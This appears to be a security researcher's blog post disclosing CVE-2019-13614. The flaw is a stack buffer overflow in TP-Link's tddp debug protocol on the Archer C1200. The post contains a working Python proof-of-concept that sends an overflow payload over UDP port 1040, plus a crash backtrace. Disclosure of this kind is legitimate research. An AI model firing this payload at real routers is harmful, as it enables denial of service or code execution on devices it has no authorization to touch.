---
layout: post
title: "[CVE-2019-13614] tddp CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow"
excerpt: "A debug protocol overflow."
modified: 2019-07-15
categories: proof-of-concept
tags: ["tp-link"]
comments: true
---

# Overview
CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.

# Proof-of-Concept
{% highlight python %}
#!/usr/bin/python3

# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0

import sys
import binascii
import socket

rhost = "target_ip"
payload = "A" * 48 + "BBBBCCCCDDDD"

port_send = 1040

tddp_ver = "01"
tddp_command = "a2"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X" % 00

tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

# Send a request
sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
argument = "%s" % payload
packet = packet + argument.encode()
sock_send.sendto(packet, (rhost, port_send))
sock_send.close()
{% endhighlight %}

# Crash Analysis
{% highlight bash %}
#0  0xff725778 in feof () from /lib/libc.so.0
#1  0x0000d56c in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
{% endhighlight %}
